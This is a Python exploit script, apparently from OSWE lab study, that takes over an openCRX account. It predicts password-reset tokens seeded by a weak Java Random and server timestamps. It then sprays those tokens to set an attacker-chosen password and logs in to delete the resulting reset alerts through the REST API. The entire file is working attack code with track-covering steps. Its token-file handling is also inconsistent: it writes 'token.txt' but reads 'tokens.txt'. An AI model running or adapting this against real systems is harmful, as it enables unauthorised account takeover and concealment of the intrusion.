import requests
import urllib3
import argparse
import subprocess
import sys
from datetime import datetime
import pytz
import os
from bs4 import BeautifulSoup
from rich.console import Console


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser(
                    prog='OpenCRX Password Reset Exploit',
                    description='Uses a weak Java Random function to guess a reset token and set a user password',
                    epilog='Please visit HexRav3n for more info')
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()

target_reset = "http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp"
target_confirm = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"
target_login = "http://opencrx:8080/opencrx-core-CRX/j_security_check"

console = Console()

def run_token_generation(s, user):
    response = s.post(target_reset, data={'id': user}, proxies=proxies, verify=False)
    date_header = response.headers.get('Date', 'Not found')
    #https://www.programiz.com/python-programming/datetime/strptime
    gmt_dt = datetime.strptime(date_header, '%a, %d %b %Y %H:%M:%S %Z')
    gmt_tz = pytz.timezone('GMT')
    gmt_dt = gmt_tz.localize(gmt_dt)
    pst_tz = pytz.timezone('US/Pacific')
    pst_dt = gmt_dt.astimezone(pst_tz)
    epoch_time_ms = int(pst_dt.timestamp() * 1000)
    start_time_epoch = epoch_time_ms - 300
    end_time_epoch = epoch_time_ms + 300
    console.log("[green] [+] Generating timestamp...")
    console.log(f"[white] [+] Starting timestamp: {start_time_epoch}")
    console.log(f"[white] [+] Ending timestamp: {end_time_epoch}")
    token_output = subprocess.run(["java", "/home/ryan/Documents/OSWE/7-OpenCRX/OpenCRXToken.java", str(start_time_epoch), str(end_time_epoch), ">> token.txt"], capture_output=True, text=True)
    console.log("[green] [+] Generating tokens...")

def token_spray(s, user, password):
    console.log("[green] [+] Starting the token spray...")
    with open("tokens.txt", "r") as f:
        for word in f:
            # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
            payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':user,'password1':password,'password2':password}

            r = s.post(url=target_confirm, data=payload, proxies=proxies, verify=False)
            res = r.text
            console.log(f"[white] [+] Trying token: {word}")

            if "Unable to reset password" not in res:
                console.log(f"[red] [+] Found a valid token! {word}")
                
                break
def login_and_remove_alerts(user, password):
    session = requests.Session()
    console.log("[green] [+] Logging in to cleanup password reset alerts....")
    response = session.get("http://opencrx:8080/opencrx-core-CRX/Login.jsp", proxies=proxies)
    response = session.get("http://opencrx:8080/opencrx-core-CRX/Login.jsp?loginFailed=false", proxies=proxies)
    response = session.get("http://opencrx:8080/opencrx-core-CRX/jsp/GetPath.jsp?getPath=true", proxies=proxies)
    response = session.get("http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet?loginFailed=false", proxies=proxies)

    # Log in to the website
    login_url = 'http://opencrx:8080/opencrx-core-CRX/j_security_check'
    login_data = {
        'j_username': user,
        'j_password': password
    }
    response = session.post(login_url, data=login_data, proxies=proxies)

    if response.status_code != 200:
        console.log(":warning: [bold red] [-] Warning login failed!")
        sys.exit(0)

    get_url = 'http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet'
    response = session.get(get_url, proxies=proxies)

    soup = BeautifulSoup(response.content, "html.parser")

    script_tag = soup.find('script', type='text/javascript')

    redirect_url = script_tag.string.split("window.location.href='")[1].split("';")[0]

    response = session.get(redirect_url, proxies=proxies)

    console.log("[white] [+] Enumerating password reset alerts....")

    alerts_api = "http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/alert"

    rest_session = requests.Session()

    rest_res = rest_session.get("http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/:api-ui", auth=(user, password), proxies=proxies)

    rest_res = rest_session.get(alerts_api, proxies=proxies)
    soup2 = BeautifulSoup(rest_res.content, "xml")

    alert_ids = []

    tags = soup2.find_all('identity')
 

    for tag in tags:
        if tag.string and "alert/" in tag.string:
            alert_id = tag.string.split("alert/")[1].split("]]")[0]
            alert_ids.append(alert_id)
    
    console.log("[white] [+] Found the following alert IDs....")
    print(alert_ids)

    console.log("[gren] [+] Deleting password reset alerts....")

    for alert_id in alert_ids:
        rest_session.delete(f"http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/alert/{alert_id}", proxies=proxies)
    
    rest_session.close()

if __name__ == "__main__":
    console.log(":ghost: [red] [+] Starting now...")
    
    s = requests.session()
    user = args.user
    password = args.password

    console.log(f":man: [white] [+] Username will be: {user}")
    console.log(f":man: [white] [+] Password will be: {password}")
    run_token_generation(s, user)
    token_spray(s, user, password)
    if os.path.exists("tokens.txt"):
       os.remove("tokens.txt")
    
    login_and_remove_alerts(user, password)

    console.log(":fox_face: [red] [+] Exploit Complete!")

    s.close()




